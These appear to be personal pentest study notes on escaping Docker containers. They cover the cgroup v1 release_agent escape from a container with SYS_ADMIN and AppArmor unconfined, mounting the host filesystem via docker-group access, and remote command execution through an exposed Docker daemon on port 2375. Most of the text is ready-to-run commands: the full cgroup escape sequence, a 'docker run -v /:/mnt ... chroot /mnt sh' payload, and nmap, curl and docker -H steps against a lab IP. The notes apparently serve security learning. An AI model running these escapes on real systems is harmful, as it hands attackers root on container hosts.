**cgroups release_agent feature 

         An exploit that launches a process on the host from within a Docker container run with the --privileged flag. The PoC achieves this by abusing the Linux cgroup v1 “notification on release” feature.The 
--privileged flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux


   				Requirements to use this technique
              * running as root inside the container
              * container must be run with the SYS_ADMIN and allow the mount syscall
              * The cgroup v1 virtual filesystem must be mounted read-write inside the container

Docker starts containers with the docker-default AppArmor policy by default, which prevents the use of the mount syscall even when the container is run with SYS_ADMIN.
A container would be vulnerable to this technique if run with the flags -> --security-opt apparmor=unconfined --cap-add=SYS_ADMIN

```
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x   // in case of “mount: /tmp/cgrp: special device cgroup does not exist” error : replace rdma with memory 
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so. 

**Escaping via Exposed Docker Daemon

attacker should be a member of docker group or root inorder to run docker commands on the host 

attack payload ->  docker run -v /:/mnt --rm -it alpine chroot /mnt sh

         lets break down the payload 
                  docker run to start the new container and mount the host's file system (/) to (/mnt) in the new container: docker run -v /:/mnt
                  to run interactively -it
                  chroot to change the root directory of the container to be /mnt: chroot /mnt
                   container to run sh to gain a shell and execute commands in the container: sh

**Remote Code Execution via Exposed Docker Daemon

Docker Engine will listen on a port when configured to be run remotely. 
vulnerability here is Docker is remotely accessible and allows anyone to execute commands

         steps to repeate 
                           -> findout if docker is running remotely //nmap -sV -p 2375 IP
                           ->  use the curl command to start interacting with the exposed Docker daemon. Confirming that we can access the Docker
                               //curl http://10.10.145.226:2375/version
                           ->  docker -H tcp://10.10.145.226:2375 ps to execute arbitary commands 


         2375: unencrypted docker socket, remote root passwordless access to the host
         2376: tls encrypted socket, most likely this is your CI servers 4243 port as a modification of the https 443 port
         2377: swarm mode socket, for swarm managers, not for docker clients
         5000: docker registry service
         4789 and 7946: overlay networking
         Only the first two are set with dockerd -H, swarm mode can be configured as part of docker swarm init --listen-addr or docker swarm join --listen-addr.



